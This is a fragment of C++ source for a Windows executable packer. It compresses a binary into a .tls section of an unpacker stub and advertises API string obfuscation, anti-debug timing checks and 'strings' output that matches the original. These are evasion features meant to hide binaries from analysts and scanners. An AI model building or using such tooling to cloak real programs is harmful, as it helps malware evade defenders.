        char stubExePath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        sprintf(stubExePath, "%s\\unpacker_stub.exe", tempPath);

        if (!compileStub(stubExePath)) {
            return false;
        }

        printf("[*] Injecting resources and packed data into stub...\n");
        if (!injectPackedDataAndResources(stubExePath, packedSectionData, outputPath)) {
            DeleteFileA(stubExePath);
            return false;
        }

        DeleteFileA(stubExePath);

        printf("\n[+] ========================================\n");
        printf("[+] Successfully packed!\n");
        printf("[+] Original size:  %lu bytes\n", (unsigned long)fileSize);
        printf("[+] Compression:    %.1f%%\n", (100.0 * compressed.size() / fileSize));
        printf("[+] Section name:   .tls\n");
        printf("[+] Magic number:   0x%08lX\n", (unsigned long)magic);
        if (hasResources) {
            printf("[+] Resources:      Preserved (%lu bytes)\n", (unsigned long)originalResourceData.size());
        } else {
            printf("[+] Resources:      None found\n");
        }
        printf("[+] Output file:    %s\n", outputPath.c_str());
        printf("[+] ========================================\n\n");
        printf("[i] Features:\n");
        printf("    - Original .rsrc section preserved\n");
        printf("    - 'strings' output matches original\n");
        printf("    - Packed data in .tls section\n");
        printf("    - API string obfuscation\n");
        printf("    - Anti-debug timing checks\n\n");

        return true;
    }

    void run(int argc, char* argv[]) {
        printBanner();

        if (!parseArguments(argc, argv)) {
            return;
        }

        if (!pack()) {
            fprintf(stderr, "[-] Packing failed!\n");
        }
    }
};

int main(int argc, char* argv[]) {
    try {
        ResourcePreservingPacker packer;
        packer.run(argc, argv);
        return 0;
    }
    catch (const std::exception& e) {
        fprintf(stderr, "[-] Error: %s\n", e.what());
        return 1;
    }
    catch (...) {
        fprintf(stderr, "[-] Unknown error occurred\n");
        return 1;
    }
}